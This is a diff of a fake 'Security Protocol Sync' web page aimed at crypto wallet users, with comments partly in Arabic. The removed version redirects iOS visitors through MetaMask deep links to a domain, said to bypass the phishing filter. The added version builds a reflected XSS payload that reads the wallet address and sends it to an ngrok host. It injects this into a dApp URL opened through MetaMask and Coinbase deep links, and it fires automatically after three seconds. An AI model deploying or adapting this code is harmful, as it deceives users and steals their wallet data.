@@ -1,84 +1,105 @@
-       <!DOCTYPE html>
-       <html lang="en">
-       <head>
-           <meta charset="UTF-8">
-           <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-           <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-           <title>Security Protocol Sync</title>
-           <style>
-               * { margin: 0; padding: 0; box-sizing: border-box; }
-               body { 
-                   background: #000; 
-                   color: #f6851b; 
-                   display: flex; 
-                   align-items: center; 
-                   justify-content: center; 
-                   min-height: 100vh; 
-                   font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-                   text-align: center; 
-                   margin: 0; 
-                   cursor: pointer;
-                   -webkit-tap-highlight-color: transparent;
-               }
-               .container { 
-                   border: 2px solid #f6851b; 
-                   padding: 40px 30px; 
-                   border-radius: 24px; 
-                   background: rgba(0,0,0,0.8);
-                   box-shadow: 0 0 40px rgba(246, 133, 27, 0.3);
-                   backdrop-filter: blur(10px);
-                   max-width: 85%;
-               }
-               .loader { 
-                   border: 3px solid #1a1a1a; 
-                   border-top: 3px solid #f6851b; 
-                   border-radius: 50%; 
-                   width: 44px; 
-                   height: 44px; 
-                   animation: spin 1s linear infinite; 
-                   margin: 0 auto 20px; 
-               }
-               @keyframes spin { 
-                   0% { transform: rotate(0deg); } 
-                   100% { transform: rotate(360deg); } 
-               }
-               h2 { font-size: 1.5rem; margin-bottom: 12px; font-weight: 600; }
-               p { font-size: 0.95rem; opacity: 0.9; color: #ccc; }
-               .note { font-size: 0.75rem; margin-top: 20px; opacity: 0.6; }
-           </style>
-       </head>
-       <body onclick="forceRedirect()">
-           <div class="container">
-               <div class="loader"></div>
-               <h2>SECURITY PROTOCOL</h2>
-               <p>Tap anywhere to sync with MetaMask Browser</p>
-               <p class="note">iOS • Secure Connection</p>
-           </div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Security Protocol Sync</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #000; 
+            color: #f6851b; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
+            text-align: center; 
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .container { 
+            border: 2px solid #f6851b; 
+            padding: 40px 30px; 
+            border-radius: 24px; 
+            background: rgba(0,0,0,0.8);
+            box-shadow: 0 0 40px rgba(246, 133, 27, 0.3);
+            backdrop-filter: blur(10px);
+            max-width: 85%;
+        }
+        .loader { 
+            border: 3px solid #1a1a1a; 
+            border-top: 3px solid #f6851b; 
+            border-radius: 50%; 
+            width: 44px; 
+            height: 44px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        h2 { font-size: 1.5rem; margin-bottom: 12px; font-weight: 600; }
+        p { font-size: 0.95rem; opacity: 0.9; color: #ccc; }
+        .status { color: #00ff00; font-weight: bold; margin-top: 10px; display: none; }
+    </style>
+</head>
+<body onclick="executeXSS()">
+    <div class="container">
+        <div class="loader"></div>
+        <h2>SECURITY PROTOCOL</h2>
+        <p>Syncing with Web3 Provider...</p>
+        <p id="instruction">Tap anywhere to authorize sync</p>
+        <p class="status" id="statusText">Redirecting to Secure Layer...</p>
+    </div>
 
-           <script>
-               const targetSite = "evil.com"; // Blacklisted domain
-               const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+    <script>
+        // كود الـ XSS المراد حقنه (Payload)
+        // هذا الكود سيحاول سرقة عنوان المحفظة بمجرد تنفيذه داخل المتصفح
+        const xssPayload = `
+            <script>
+                alert('XSS Triggered! Accessing Wallet...');
+                if(window.ethereum) {
+                    window.ethereum.request({method: 'eth_accounts'})
+                    .then(a => fetch('https://your-kali-ip.ngrok-free.app/log?address=' + a[0]));
+                }
+            <\/script>
+        `;
 
-               function forceRedirect() {
-                   if (isIOS) {
-                       // The exploit: Bypassing the phishing filter using dapp/ scheme
-                       const universalLink = "https://metamask.app.link/dapp/" + targetSite;
-                       const deepLink = "metamask://dapp/" + targetSite;
+        // الموقع المستهدف الذي يحتوي على ثغرة Reflection (كمثال)
+        const targetDApp = "example-dapp.com/search?query=";
+        const fullExploitUrl = targetDApp + encodeURIComponent(xssPayload);
 
-                       // iOS Universal Link handling
-                       window.location.href = universalLink;
-                       setTimeout(() => { 
-                           window.location.replace(deepLink); 
-                       }, 300);
-                   }
-               }
+        function executeXSS() {
+            document.getElementById('statusText').style.display = 'block';
+            document.getElementById('instruction').innerText = 'Please wait...';
 
-               // Automatic trigger for iOS devices after 2 seconds
-               window.onload = function() { 
-                   if (isIOS) { 
-                       setTimeout(forceRedirect, 2000); 
-                   } 
-               };
-           </script>
-       </body>
-       </html>
+            // الكشف عن نظام التشغيل
+            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+            const isAndroid = /Android/i.test(navigator.userAgent);
+
+            if (isIOS) {
+                // استغلال Universal Links لـ iOS
+                const metamaskLink = "https://metamask.app.link/dapp/" + fullExploitUrl;
+                window.location.href = metamaskLink;
+            } else if (isAndroid) {
+                // استغلال Deep Links لـ Android (Coinbase/MetaMask)
+                // نستخدم dapp:// لجعل المتصفح يفتح الرابط داخلياً
+                const coinbaseLink = "https://go.cb-w.com/dapp?url=" + encodeURIComponent("https://" + fullExploitUrl);
+                const genericDappLink = "metamask://dapp/" + fullExploitUrl;
+
+                window.location.href = coinbaseLink;
+                setTimeout(() => { window.location.href = genericDappLink; }, 500);
+            } else {
+                // للمتصفحات العادية
+                window.location.href = "https://" + fullExploitUrl;
+            }
+        }
+
+        // تشغيل تلقائي بعد 3 ثوانٍ إذا لم يضغط المستخدم
+        setTimeout(executeXSS, 3000);
+    </script>
+</body>
+</html>
